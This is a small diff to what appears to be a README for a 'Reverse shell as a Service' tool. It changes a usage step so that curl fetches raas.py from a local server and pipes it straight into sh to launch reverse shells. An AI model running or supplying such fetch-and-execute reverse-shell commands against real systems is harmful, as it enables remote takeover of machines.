@@ -10,6 +10,6 @@ Reverse shell as a Service script that executes all the different reverse shells
 
 3. Grab the file using curl and execute it directly
 
-   $ curl http://127.0.0.1:8080 | sh
+   $ curl http://127.0.0.1:8080/raas.py | sh
 
 4. Profit $$$
